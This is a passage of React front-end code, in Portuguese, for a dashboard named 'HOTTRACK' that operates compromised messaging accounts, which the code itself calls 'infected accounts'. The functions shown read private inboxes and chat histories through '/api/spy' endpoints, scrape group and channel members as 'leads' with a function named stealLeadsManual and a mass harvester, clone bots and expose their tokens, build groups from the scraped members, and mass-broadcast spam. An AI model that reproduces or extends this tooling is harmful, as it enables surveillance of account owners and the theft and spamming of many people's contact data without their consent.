              if(data.success) {
                  sessionCount += data.count; setTotalHarvestedSession(sessionCount);
                  setHarvestedIds(prev => new Set(prev).add(target.id)); 
                  addLog(`[SUCESSO] +${data.count} leads de "${target.title}"`);
              }
          } catch (e) {}
          await new Promise(r => setTimeout(r, 2500));
      }
      setIsHarvestingAll(false);
      addLog(`[SCANNER] Aspiração Finalizada. Total: ${sessionCount}`);
      fetchData();
  };

  const openChatViewer = async (chat) => {
      setViewingChat(chat); setLoadingHistory(true); setChatHistory([]);
      try {
        const res = await authenticatedFetch('/api/spy/get-history', { method: 'POST', body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id }) });
        const data = await res.json();
        setChatHistory(data.history || []);
      } catch (e) {}
      setLoadingHistory(false);
  };

  const stealLeadsManual = async (chat) => {
      addLog(`[SCANNER] Extraindo manualmente de ${chat.title}...`);
      const res = await authenticatedFetch('/api/spy/harvest', { 
          method: 'POST', body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id, chatName: chat.title, isChannel: chat.type === 'Canal' })
      });
      const data = await res.json();
      if(data.success) {
          addLog(`[SUCESSO] +${data.count} leads capturados.`);
          setHarvestedIds(prev => new Set(prev).add(chat.id));
          fetchData();
      } else addLog(`[ERRO] Falha: ${data.error}`); 
  };

  // --- GRUPOS E DISPAROS SEGMENTADOS ---
  const createSmartGroups = async () => {
    if (selectedPhones.size === 0) return alert('Selecione contas infectadas!');
    if (!groupNameTemplate.trim()) return alert('Digite um nome para os grupos!');
    if (!confirm(`CRIAR GRUPOS INTELIGENTES?`)) return;

    setIsCreatingGroups(true); setGroupCreationProgress(0); stopBroadcastRef.current = false;
    addLog('[SISTEMA] Iniciando criação inteligente...');

    try {
      const availableCreators = Array.from(selectedPhones);
      const DELAY_BETWEEN_GROUPS = 15000; 
      const LEADS_PER_BATCH = 5000; 

      let groupsCreated = []; let totalLeadsAssigned = 0; let groupCounter = 1;

      while (true) {
        if (stopBroadcastRef.current) { addLog('[AVISO] Criação interrompida.'); break; }
        if (availableCreators.length === 0) {
          addLog('[AVISO] Sem contas. Aguardando 2 min...');
          await new Promise(r => setTimeout(r, 120000));
          continue;
        }

        const res = await authenticatedFetch(`/api/get-unassigned-leads?limit=${LEADS_PER_BATCH}`);
        const data = await res.json();
        const leads = data.leads || [];

        if (leads.length === 0) { addLog('[SUCESSO] Todos os leads distribuídos.'); break; }

        const creatorPhone = availableCreators.shift();
        const groupName = groupNameTemplate.replace('{number}', groupCounter.toString().padStart(3, '0'));

        try {
          const createRes = await authenticatedFetch('/api/create-group', {
            method: 'POST', body: JSON.stringify({ creatorPhone, leads, groupName, groupPhotoUrl })
          });
          const createData = await createRes.json();
          
          if (createData.success) {
            groupsCreated.push({ id: createData.groupId, name: groupName, creatorPhone, memberCount: leads.length, createdAt: new Date().toISOString() });
            totalLeadsAssigned += leads.length;
            setGroupCreationProgress(stats.pending ? Math.round((totalLeadsAssigned / stats.pending) * 100) : 100);
            groupCounter++;
            addLog(`[SUCESSO] Grupo criado: ${groupName} (${leads.length} membros)`);
            setTimeout(() => availableCreators.push(creatorPhone), 300000); 
          } else {
            addLog(`[ERRO] Falha ao criar grupo: ${createData.error}`);
            availableCreators.push(creatorPhone);
          }
        } catch (e) {
          addLog(`[FALHA] Erro na criação: ${e.message}`);
          availableCreators.push(creatorPhone);
        }
        await new Promise(r => setTimeout(r, DELAY_BETWEEN_GROUPS));
      }

      setCreatedGroups(groupsCreated);
      addLog(`[SUCESSO] Criação concluída: ${groupsCreated.length} grupos.`);
      fetchData();

    } catch (e) { addLog(`[FALHA] Erro crítico: ${e.message}`); }
    setIsCreatingGroups(false);
  };

  const broadcastToGroups = async () => {
    if (selectedGroupsForBroadcast.size === 0 || !groupMessage.trim()) return;
    setIsBroadcasting(true); setBroadcastProgress(0); stopBroadcastRef.current = false;
    addLog('[SISTEMA] Iniciando disparo segmentado nos grupos...');

    try {
      const targetGroups = createdGroups.filter(g => selectedGroupsForBroadcast.has(g.id));
      const DELAY_BETWEEN_GROUPS = 8000; 
      let completedCount = 0;

      for (let i = 0; i < targetGroups.length; i++) {
        if (stopBroadcastRef.current) { addLog('[AVISO] Disparo interrompido.'); break; }
        const group = targetGroups[i];
        try {
          const broadcastRes = await authenticatedFetch('/api/broadcast-group', {
            method: 'POST', body: JSON.stringify({ groupId: group.id, creatorPhone: group.creatorPhone, message: groupMessage, mediaUrl: groupMediaUrl })
          });
          const broadcastData = await broadcastRes.json();
          if (broadcastData.success) addLog(`[SUCESSO] Disparo em "${group.name}".`);
          else addLog(`[ERRO] Falha no grupo "${group.name}": ${broadcastData.error}`);
          completedCount++;
          setBroadcastProgress(Math.round((completedCount / targetGroups.length) * 100));
        } catch (e) { addLog(`[FALHA] Erro em "${group.name}": ${e.message}`); }
        if (i < targetGroups.length - 1) await new Promise(r => setTimeout(r, DELAY_BETWEEN_GROUPS));
      }
      addLog('[SUCESSO] Disparo em grupos concluído!');
    } catch (e) { addLog(`[FALHA] Erro no disparo: ${e.message}`); }
    setIsBroadcasting(false);
  };

  const stopGroupOperations = () => { stopBroadcastRef.current = true; addLog('[AVISO] Interrompendo...'); };
  const toggleGroupSelection = (groupId) => {
    const newSet = new Set(selectedGroupsForBroadcast);
    newSet.has(groupId) ? newSet.delete(groupId) : newSet.add(groupId);
    setSelectedGroupsForBroadcast(newSet);
  };
  const selectAllGroups = () => { setSelectedGroupsForBroadcast(new Set(createdGroups.map(g => g.id))); };

  // --- TOOLS ---
  const handleMassUpdateProfile = async () => {
    if (selectedPhones.size === 0) return alert('Selecione as contas!');
    setProcessing(true);
    for (const phone of Array.from(selectedPhones)) {
        addLog(`[SISTEMA] Atualizando identidade em ${phone}...`);
        await authenticatedFetch('/api/update-profile', { method: 'POST', body: JSON.stringify({ phone, newName, photoUrl }) });
    }
    setProcessing(false); addLog('[SUCESSO] Identidades atualizadas.');
  };

  const handleMassPostStory = async () => {
      if (selectedPhones.size === 0) return alert('Selecione as contas!');
      setProcessing(true);
      for (const phone of Array.from(selectedPhones)) {
          addLog(`[SISTEMA] Postando Story em ${phone}...`);
          await authenticatedFetch('/api/post-story', { method: 'POST', body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption }) });
      }
      setProcessing(false); addLog('[SUCESSO] Stories postados.');
  };

  // --- INBOX VIEWER ---
  const loadInbox = async (phone) => {
    if (!phone) return;
    setLoadingInbox(true); setSelectedInboxPhone(phone); setSelectedDialog(null); setInboxHistory([]);
    try {
      const res = await authenticatedFetch('/api/spy/get-inbox', { method: 'POST', body: JSON.stringify({ phone }) });
      const data = await res.json();
      if (data.success && data.dialogs) {
        setInboxDialogs(data.dialogs);
        if (data.dialogs.length > 0) {
          const firstUnread = data.dialogs.find(d => d.unreadCount > 0);
          setSelectedDialog(firstUnread || data.dialogs[0]);
          loadInboxHistory((firstUnread || data.dialogs[0]).id);
        }
      }
    } catch (e) {} finally { setLoadingInbox(false); }
  };

  const cloneBot = async () => {
    if (!selectedInboxPhone || !selectedDialog || selectedDialog.type !== 'Bot') return;
    const newBotName = prompt('Nome do novo bot:', `Clone_${selectedDialog.title}`);
    const newBotUsername = prompt('Username do novo bot:', `${selectedDialog.username || 'bot'}_clone`);
    if (!newBotName || !newBotUsername) return;
    setLoadingBotFlow(true);
    addLog(`[SISTEMA] Clonando bot "${selectedDialog.title}"...`);
    try {
      const res = await authenticatedFetch('/api/spy/clone-bot', {
        method: 'POST', body: JSON.stringify({ phone: selectedInboxPhone, botId: selectedDialog.id, newBotName, newBotUsername })
      });
      const data = await res.json();
      if (data.success) {
        addLog(`[SUCESSO] Bot clonado! Token: ${data.botToken}`);
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = `cloned-bot.json`; document.body.appendChild(a); a.click(); document.body.removeChild(a);
      } else addLog(`[ERRO] ${data.error}`);
    } catch (e) {} finally { setLoadingBotFlow(false); }
  };

  const loadInboxHistory = async (dialogId) => {
    if (!selectedInboxPhone || !dialogId) return;
    setLoadingInboxHistory(true);
    try {
      const isBot = selectedDialog?.type === 'Bot';
      const res = await authenticatedFetch(isBot ? '/api/spy/get-history-bots' : '/api/spy/get-history', {
        method: 'POST', body: JSON.stringify({ phone: selectedInboxPhone, chatId: dialogId, limit: 100 })
      });
      const data = await res.json();
      if (data.success && data.history) setInboxHistory(data.history);
    } catch (e) {} finally { setLoadingInboxHistory(false); }
  };

  const selectDialog = (dialog) => { setSelectedDialog(dialog); loadInboxHistory(dialog.id); };
  const refreshInbox = async () => { if (selectedInboxPhone) await loadInbox(selectedInboxPhone); };
  const refreshHistory = async () => { if (selectedDialog) await loadInboxHistory(selectedDialog.id); };

  const formatFileSize = (bytes) => {
    if (!bytes) return '';
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
  };

  const formatMessageTime = (date) => {
    const msgDate = new Date(date);
    return msgDate.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
  };

  const filteredGroups = filterNumber ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) : allGroups;
  const filteredChannels = filterNumber ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) : allChannels;


  // ==============================================================================
  // RENDERIZAÇÃO (INTERFACE)
  // ==============================================================================
  if (!isAuthenticated) return (
      <div style={{height:'100vh', background:'#000000', display:'flex', alignItems:'center', justifyContent:'center', flexDirection:'column', gap:'20px', fontFamily: 'Inter, sans-serif'}}>
          <div style={{display:'flex', gap:'10px', marginBottom:'20px'}}>
              <Button variant={loginMode === 'user' ? 'primary' : 'secondary'} onClick={()=>setLoginMode('user')}>Usuário</Button>
              <Button variant={loginMode === 'admin' ? 'primary' : 'secondary'} onClick={()=>setLoginMode('admin')}>Administrador</Button>
          </div>
          
          <Card style={{width: '320px', boxShadow: '0 4px 24px rgba(0,0,0,0.5)'}}>
              <h2 style={{color:'#EDEDED', textAlign:'center', marginTop:0, fontWeight: 600, letterSpacing: '-0.5px'}}>HOTTRACK</h2>
              {loginMode === 'user' ? (
                  <form onSubmit={handleUserLogin}>
                      <Input value={usernameInput} onChange={e=>setUsernameInput(e.target.value)} placeholder="Identificação" style={{marginBottom:'10px'}} autoFocus />
                      <Input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Autenticação" style={{marginBottom:'20px'}} />
                      <Button type="submit" style={{width:'100%'}}>Acessar Plataforma</Button>
                  </form>
              ) : (
                  <form onSubmit={handleAdminTokenLogin}>
                      <Input type="password" value={adminTokenInput} onChange={e=>setAdminTokenInput(e.target.value)} placeholder="Chave de Acesso" style={{marginBottom:'20px'}} autoFocus />
                      <Button type="submit" style={{width:'100%'}}>Acessar Admin</Button>
                  </form>
              )}
          </Card>
      </div>
  );

  return (
    <div style={{ backgroundColor: '#000000', color: '#EDEDED', minHeight: '100vh', fontFamily: 'Inter, -apple-system, sans-serif' }}>

        <Sidebar tab={tab} setTab={setTab} isAdmin={isAdmin} onLogout={handleLogout} />

        {/* MODAL DE CHAT */}
        {viewingChat && (
            <div style={{position:'fixed', top:0, left:0, width:'100%', height:'100%', background:'rgba(0,0,0,0.9)', zIndex:1000, display:'flex', alignItems:'center', justifyContent:'center'}}>
                <Card style={{width:'700px', height:'85%', display:'flex', flexDirection:'column', padding:0, overflow:'hidden'}}>
                    <div style={{padding:'20px', borderBottom:'1px solid #1F1F1F', display:'flex', justifyContent:'space-between', alignItems:'center'}}>
                        <div>
                            <h3 style={{margin:0, color:'#FFF', fontSize: '15px'}}>{viewingChat.title}</h3>
                            <small style={{color:'#8b949e'}}>Monitorado via: {viewingChat.ownerPhone}</small>
                        </div>
                        <Button variant="secondary" onClick={()=>setViewingChat(null)} style={{padding: '6px', minWidth: '40px'}}><XCircleIcon style={{width:20}}/></Button>
                    </div>
                    <div style={{flex:1, overflowY:'auto', padding:'20px', display:'flex', flexDirection:'column', gap:'15px', background:'#000'}}>
                        {loadingHistory ? <div style={{textAlign:'center', color:'#8B949E'}}>Carregando dados estruturados...</div> : 
                            chatHistory.length === 0 ? <div style={{textAlign:'center', color:'#8B949E'}}>Sem fluxos recentes.</div> :
                            chatHistory.map((m, i) => (
                                <div key={i} style={{alignSelf: m.isOut ? 'flex-end' : 'flex-start', background: m.isOut ? '#1F1F1F' : '#0A0A0A', padding:'12px', borderRadius:'8px', maxWidth:'85%', border:'1px solid #1F1F1F'}}>
                                    <div style={{fontSize:'11px', fontWeight:'500', marginBottom:'5px', color: m.isOut ? '#EDEDED' : '#8B949E'}}>{m.sender}</div>
                                    {m.media && (
                                        <div style={{marginBottom:'10px'}}><img src={m.media} alt="Mídia" style={{maxWidth:'100%', borderRadius:'4px'}} /></div>
                                    )}
                                    <div style={{color:'#EDEDED', whiteSpace:'pre-wrap', fontSize:'13px'}}>{m.text}</div>
                                </div>
                            ))
                        }
                    </div>
                </Card>
            </div>
        )}

        <div style={{ marginLeft: '240px', padding: '32px 40px', minHeight: '100vh' }}>

        {/* CABEÇALHO DA PÁGINA */}
        <div style={{ marginBottom: '32px', paddingBottom: '24px', borderBottom: '1px solid #1F1F1F' }}>
            <AnimatePresence mode="wait">
                <motion.h1
                    key={tab}
                    initial={{ opacity: 0, x: -8 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ duration: 0.2 }}
                    style={{ margin: 0, color: '#FFF', fontSize: '20px', fontWeight: '600', letterSpacing: '-0.5px' }}
                >
                    {NAV_ITEMS.find(item => item.id === tab)?.label || 'Painel'}
                </motion.h1>
            </AnimatePresence>
        </div>

        <AnimatePresence mode="wait">
            <motion.div key={tab} initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.2 }}>
                
                {/* ABA DASHBOARD */}
                {tab === 'dashboard' && (
                    <div style={{ display:'grid', gridTemplateColumns:'1fr 380px', gap:'24px' }}>
                        <Card>
                            <div style={{ display:'flex', gap:'16px', marginBottom:'32px' }}>
                                <div style={{ flex:1, padding:'24px', background:'#000', border:'1px solid #1F1F1F', borderRadius:'6px' }}>
                                    <div style={{ color:'#8B949E', fontSize:'12px', marginBottom:'8px', display:'flex', alignItems:'center', gap:'6px' }}><DocumentDuplicateIcon style={{width:14}}/> LEADS PENDENTES</div>
                                    <div style={{ color:'#EDEDED', fontSize:'28px', fontWeight:'600' }}>{stats.pending?.toLocaleString()}</div>
                                </div>
                                <div style={{ flex:1, padding:'24px', background:'#000', border:'1px solid #1F1F1F', borderRadius:'6px' }}>
                                    <div style={{ color:'#8B949E', fontSize:'12px', marginBottom:'8px', display:'flex', alignItems:'center', gap:'6px' }}><ChartBarIcon style={{width:14}}/> VOLUME ENVIADO</div>
                                    <div style={{ color:'#EDEDED', fontSize:'28px', fontWeight:'600' }}>{stats.sent?.toLocaleString()}</div>
                                </div>
                            </div>
                            
                            <div style={{ marginBottom: '24px' }}>
                                <label style={{ display:'block', marginBottom:'8px', fontSize:'12px', color:'#8B949E' }}>Media URL (Opcional)</label>
                                <Input placeholder="https://..." value={imgUrl} onChange={e=>setImgUrl(e.target.value)} />
                            </div>
                            
                            <div style={{ marginBottom: '32px' }}>
                                <label style={{ display:'block', marginBottom:'8px', fontSize:'12px', color:'#8B949E' }}>Payload (Spintax Suportado)</label>
                                <textarea 
                                    value={msg} onChange={e=>setMsg(e.target.value)} 
                                    style={{ width:'100%', height:'120px', background:'#000', color:'#EDEDED', border:'1px solid #1F1F1F', padding:'16px', borderRadius:'6px', fontSize:'13px', resize:'none', outline:'none' }}
                                />
                            </div>
                            
                            <div style={{ display: 'flex', gap: '16px' }}>
                                {!processing ? (
                                    <Button variant="primary" icon={PlayIcon} onClick={startRealCampaign} style={{ width: '100%', padding: '16px' }}>INICIALIZAR MOTOR V6</Button>
                                ) : (
                                    <Button variant="danger" icon={StopIcon} onClick={stopCampaign} style={{ width: '100%', padding: '16px' }}>INTERROMPER PROCESSO</Button>
                                )}
                            </div>

                            <div style={{ marginTop:'32px', borderTop: '1px solid #1F1F1F', paddingTop: '24px' }}>
                                <div style={{ display:'flex', justifyContent:'space-between', marginBottom:'12px' }}>
                                    <span style={{ fontSize:'12px', color:'#8B949E' }}>CONSOLE LOGS {processing && `— ${progress}%`}</span>
                                    <span onClick={()=>setLogs([])} style={{ fontSize:'12px', color:'#8B949E', cursor:'pointer' }}>Limpar</span>
                                </div>
                                <div style={{ height:'180px', overflowY:'auto', background:'#000', padding:'16px', fontSize:'11px', borderRadius:'6px', border:'1px solid #1F1F1F', color:'#8B949E', fontFamily:'monospace' }}>
                                    {logs.map((l,i)=><div key={i} style={{ marginBottom:'6px' }}>{l}</div>)}
                                </div>
                            </div>
                        </Card>

                        <Card style={{ display:'flex', flexDirection:'column' }}>
                            <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'24px' }}>
                                <h3 style={{ margin:0, fontSize: '14px', fontWeight: '500' }}>Sessões ({sessions.length})</h3>
                                <Button variant="secondary" icon={ArrowPathIcon} onClick={checkAllStatus} disabled={checkingStatus} style={{ padding: '6px 10px', fontSize: '11px' }}>Ping</Button>
                            </div>
                            <Button variant="secondary" onClick={selectAllActive} style={{ marginBottom: '16px', fontSize: '12px' }}>Selecionar Ativos</Button>
                            
                            <div style={{ flex:1, overflowY:'auto', pr:'4px' }}>
                                {sessions.map(s => (
                                    <div key={s.id} style={{ padding:'12px', marginBottom:'8px', borderRadius:'6px', border: selectedPhones.has(s.phone_number) ? '1px solid #EDEDED' : '1px solid #1F1F1F', background: '#000', display:'flex', justifyContent:'space-between', alignItems:'center', transition: 'border 0.2s' }}>
                                        <div style={{ display:'flex', alignItems:'center', gap:'12px' }}>
                                            <motion.div 
                                                animate={{ scale: s.is_active ? [1, 1.2, 1] : 1 }} 
                                                transition={{ repeat: Infinity, duration: 2 }}
                                                style={{ width: 6, height: 6, borderRadius: '50%', background: s.is_active ? '#32D74B' : '#FF453A' }} 
                                            />
                                            <div style={{ fontSize:'13px', color: s.is_active ? '#EDEDED' : '#8B949E' }}>{s.phone_number}</div>
                                        </div>
                                        <div style={{ display:'flex', gap:'12px', alignItems: 'center' }}>
                                            <input type="checkbox" checked={selectedPhones.has(s.phone_number)} onChange={()=>toggleSelect(s.phone_number)} style={{ accentColor: '#EDEDED', cursor: 'pointer' }} />
                                            <Button variant="secondary" style={{padding: '4px', minWidth: 'auto', background:'transparent', border:'none'}} onClick={() => { setTab('inbox'); loadInbox(s.phone_number); }} disabled={!s.is_active}><InboxArrowDownIcon style={{width: 14}}/></Button>
                                            <TrashIcon onClick={()=>handleDeleteSession(s.phone_number)} style={{ width: 14, color: '#8B949E', cursor: 'pointer' }} />
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </Card>
                    </div>
                )}

                {/* ABA GRUPOS */}
                {tab === 'groups' && (
                    <div style={{ display:'grid', gridTemplateColumns:'1.2fr 1fr', gap:'24px' }}>
                        <Card>
                            <h3 style={{ margin: '0 0 24px 0', fontSize: '14px', fontWeight: '500', color: '#EDEDED' }}>Criação Inteligente</h3>
                            <Input placeholder="Template do Nome (ex: VIP Club {number})" value={groupNameTemplate} onChange={e=>setGroupNameTemplate(e.target.value)} style={{marginBottom: '16px'}} />
                            <Input placeholder="URL da Imagem Base" value={groupPhotoUrl} onChange={e=>setGroupPhotoUrl(e.target.value)} style={{marginBottom: '24px'}} />
                            
                            {!isCreatingGroups ? (
                                <Button variant="secondary" icon={UserGroupIcon} onClick={createSmartGroups} style={{ width: '100%', marginBottom: '24px' }}>PROCESSAR E CRIAR</Button>
                            ) : (
                                <Button variant="danger" icon={StopIcon} onClick={stopGroupOperations} style={{ width: '100%', marginBottom: '24px' }}>INTERROMPER</Button>
                            )}

                            <div style={{ fontSize: '12px', color: '#8B949E', marginBottom: '12px' }}>Grupos em Cache ({createdGroups.length})</div>
                            <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
                                {createdGroups.map(g => (
                                    <div key={g.id} style={{ padding: '12px', background: '#000', border: '1px solid #1F1F1F', borderRadius: '6px', marginBottom: '8px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                                        <div>
                                            <div style={{ fontSize: '13px', color: '#EDEDED', fontWeight: '500' }}>{g.name}</div>
                                            <div style={{ fontSize: '11px', color: '#8B949E' }}>{g.memberCount} instâncias • {g.creatorPhone}</div>
                                        </div>
                                        <input type="checkbox" checked={selectedGroupsForBroadcast.has(g.id)} onChange={() => toggleGroupSelection(g.id)} style={{ accentColor: '#EDEDED', cursor: 'pointer' }} />
                                    </div>
                                ))}
                            </div>
                        </Card>

                        <Card>
                            <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'24px' }}>
                                <h3 style={{ margin:0, fontSize: '14px', fontWeight: '500' }}>Roteamento Massivo</h3>
                                <Button variant="secondary" onClick={selectAllGroups} style={{ padding: '6px 10px', fontSize: '11px' }}>Selecionar Todos</Button>
                            </div>
                            
                            <Input placeholder="Mídia de Anexo (URL)" value={groupMediaUrl} onChange={e=>setGroupMediaUrl(e.target.value)} style={{marginBottom: '16px'}} />
                            <textarea value={groupMessage} onChange={e=>setGroupMessage(e.target.value)} placeholder="Payload textual do disparo..." style={{ width:'100%', height:'120px', background:'#000', color:'#EDEDED', border:'1px solid #1F1F1F', padding:'16px', borderRadius:'6px', fontSize:'13px', resize:'none', outline:'none', marginBottom: '24px' }} />
                            
                            {!isBroadcasting ? (
                                <Button variant="primary" icon={PaperAirplaneIcon} onClick={broadcastToGroups} disabled={selectedGroupsForBroadcast.size === 0 || !groupMessage.trim()} style={{ width: '100%' }}>DESPACHAR NOS ALVOS</Button>
                            ) : (
                                <Button variant="danger" icon={StopIcon} onClick={stopGroupOperations} style={{ width: '100%' }}>ABORTAR</Button>
                            )}
                        </Card>
                    </div>
                )}

                {/* ABA INBOX */}
                {tab === 'inbox' && (
                    <div style={{ display:'grid', gridTemplateColumns:'350px 1fr', gap:'24px', height:'calc(100vh - 150px)' }}>
                        <Card style={{ display: 'flex', flexDirection: 'column', padding: 0, overflow: 'hidden' }}>
                            <div style={{ padding: '20px', borderBottom: '1px solid #1F1F1F' }}>
                                <div style={{ fontSize: '13px', color: '#8B949E', marginBottom: '12px' }}>Fonte de Dados</div>
                                <Select value={selectedInboxPhone} onChange={(e) => loadInbox(e.target.value)}>
                                    <option value="">Selecione a sessão...</option>
                                    {sessions.filter(s => s.is_active).map(s => <option key={s.phone_number} value={s.phone_number}>{s.phone_number}</option>)}
                                </Select>
                            </div>
                            <div style={{ flex: 1, overflowY: 'auto', background: '#000' }}>
                                {inboxDialogs.map(dialog => (
                                    <div 
                                        key={dialog.id} onClick={() => selectDialog(dialog)}
                                        style={{ padding: '16px 20px', borderBottom: '1px solid #1F1F1F', cursor: 'pointer', background: selectedDialog?.id === dialog.id ? '#141414' : 'transparent', transition: 'background 0.2s' }}
                                    >
                                        <div style={{ fontSize: '13px', color: '#EDEDED', fontWeight: selectedDialog?.id === dialog.id ? '500' : '400' }}>{dialog.title}</div>
                                        <div style={{ fontSize: '11px', color: '#8B949E', marginTop: '4px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{dialog.lastMessage}</div>
                                    </div>
                                ))}
                            </div>
                        </Card>

                        <Card style={{ padding: 0, display: 'flex', flexDirection: 'column' }}>
                            {selectedDialog ? (
                                <>
                                    <div style={{ padding: '20px', borderBottom: '1px solid #1F1F1F', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                                        <div style={{ fontSize: '14px', fontWeight: '500' }}>{selectedDialog.title}</div>
                                        <div style={{ display: 'flex', gap: '8px' }}>
                                            {selectedDialog.type === 'Bot' && (
                                                <Button variant="secondary" icon={DocumentDuplicateIcon} onClick={cloneBot} disabled={loadingBotFlow} style={{ padding: '6px 12px', fontSize: '11px' }}>Clonar Matriz</Button>
                                            )}
                                            <Button variant="secondary" icon={ArrowPathIcon} onClick={refreshHistory} disabled={loadingInboxHistory} style={{ padding: '6px 12px', fontSize: '11px' }}>Sync</Button>
                                        </div>
                                    </div>
                                    <div style={{ flex: 1, background: '#000', padding: '20px', overflowY: 'auto' }}>
                                        {inboxHistory.map((msg, idx) => (
                                            <div key={idx} style={{ marginBottom: '12px', textAlign: msg.isOut ? 'right' : 'left' }}>
                                                <div style={{ display: 'inline-block', maxWidth: '70%', background: msg.isOut ? '#1F1F1F' : '#0A0A0A', padding: '12px 16px', borderRadius: '8px', border: '1px solid #1F1F1F', color: '#EDEDED', fontSize: '13px', textAlign: 'left' }}>
                                                    <div style={{ fontSize: '10px', color: '#8B949E', marginBottom: '4px' }}>{msg.sender} • {formatMessageTime(msg.date)}</div>
                                                    <div>{msg.text}</div>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                </>
                            ) : (
                                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%', color: '#8B949E', fontSize: '13px' }}>
                                    <ChatBubbleLeftRightIcon style={{ width: 24, marginRight: 8 }} /> Visualizador de Escuta Protegido
                                </div>
                            )}
                        </Card>
                    </div>
                )}

                {/* ABA SPY */}
                {tab === 'spy' && (
                    <Card>
                        <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'24px' }}>
                            <div>
                                <h3 style={{ margin:0, fontSize: '14px', fontWeight: '500' }}>Topologia Global de Alvos</h3>
                                <div style={{ fontSize: '12px', color: '#8B949E' }}>{allGroups.length} Grupos e {allChannels.length} Canais mapeados</div>
                            </div>
                            <div style={{ display:'flex', gap:'12px' }}>
                                <Input placeholder="Refinar alvo..." value={filterNumber} onChange={e=>setFilterNumber(e.target.value)} style={{ width: '200px' }} />
                                <Button variant="secondary" onClick={scanNetwork} disabled={isScanning}>{isScanning ? 'Mapeando...' : 'Re-Scan Total'}</Button>
                                <Button variant="primary" onClick={startMassHarvest} disabled={isHarvestingAll}>Automação Aspirador</Button>
                            </div>
                        </div>

                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>
                            <div style={{ border: '1px solid #1F1F1F', borderRadius: '8px', background: '#000', padding: '16px' }}>
                                <h4 style={{ fontSize: '13px', color: '#8B949E', margin: '0 0 16px 0' }}>Vetores A: Grupos ({filteredGroups.length})</h4>
                                <div style={{ maxHeight: '500px', overflowY: 'auto', paddingRight: '8px' }}>
                                    {filteredGroups.map(g => {
                                        const isDone = harvestedIds.has(g.id);
                                        return (
                                        <div key={g.id} style={{ padding: '12px', borderBottom: '1px solid #1F1F1F', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                                            <div>
                                                <div style={{ fontSize: '13px', color: isDone ? '#8B949E' : '#EDEDED' }}>{g.title} {isDone && <CheckCircleIcon style={{width: 14, color: '#32D74B', display:'inline', marginLeft:'4px'}} />}</div>
                                                <div style={{ fontSize: '11px', color: '#8B949E' }}>{g.participantsCount} leads</div>
                                            </div>
                                            <div style={{ display: 'flex', gap: '8px' }}>
                                                <Button variant="secondary" onClick={()=>openChatViewer(g)} style={{ padding: '6px', minWidth: 'auto' }}><EyeIcon style={{width: 14}}/></Button>
                                                <Button variant="secondary" onClick={()=>stealLeadsManual(g)} style={{ padding: '6px 12px', fontSize: '11px', background: isDone ? '#051A0A' : '#141414', borderColor: isDone ? '#0A3A15' : '#1F1F1F' }}>{isDone ? 'Concluído' : 'Extrair'}</Button>
                                            </div>
                                        </div>
                                    )})}
                                </div>
                            </div>
                            <div style={{ border: '1px solid #1F1F1F', borderRadius: '8px', background: '#000', padding: '16px' }}>
                                <h4 style={{ fontSize: '13px', color: '#8B949E', margin: '0 0 16px 0' }}>Vetores B: Canais ({filteredChannels.length})</h4>
                                <div style={{ maxHeight: '500px', overflowY: 'auto', paddingRight: '8px' }}>
                                    {filteredChannels.map(c => {
                                        const isDone = harvestedIds.has(c.id);
                                        return (
                                        <div key={c.id} style={{ padding: '12px', borderBottom: '1px solid #1F1F1F', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                                            <div>
                                                <div style={{ fontSize: '13px', color: isDone ? '#8B949E' : '#EDEDED' }}>{c.title} {isDone && <CheckCircleIcon style={{width: 14, color: '#32D74B', display:'inline', marginLeft:'4px'}} />}</div>
                                                <div style={{ fontSize: '11px', color: '#8B949E' }}>{c.participantsCount} leads</div>
                                            </div>
                                            <div style={{ display: 'flex', gap: '8px' }}>
                                                <Button variant="secondary" onClick={()=>openChatViewer(c)} style={{ padding: '6px', minWidth: 'auto' }}><EyeIcon style={{width: 14}}/></Button>
                                                <Button variant="secondary" onClick={()=>stealLeadsManual(c)} style={{ padding: '6px 12px', fontSize: '11px' }}>Processar</Button>
                                            </div>
                                        </div>
                                    )})}
                                </div>
                            </div>
                        </div>
                    </Card>
                )}

                {/* ABA CANAIS */}
                {tab === 'channels' && (
                    <Card>
                        <h3 style={{ margin: '0 0 24px 0', fontSize: '14px', fontWeight: '500', color: '#EDEDED' }}>Arquitetura Massiva de Canais</h3>
                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '16px', marginBottom: '24px' }}>
                            <Input placeholder="Códice (ex: Canal_V)" value={massChannelPrefix} onChange={e=>setMassChannelPrefix(e.target.value)} />
                            <Input placeholder="Metadados do Canal" value={massChannelDescription} onChange={e=>setMassChannelDescription(e.target.value)} />
                            <Input placeholder="Alocação por nó" type="number" value={leadsPerChannel} onChange={e=>setLeadsPerChannel(e.target.value)} />
                            <Input placeholder="Seed Numérica" type="number" value={startNumber} onChange={e=>setStartNumber(e.target.value)} />
                        </div>
                        <div style={{ display: 'flex', gap: '16px', marginBottom: '32px' }}>
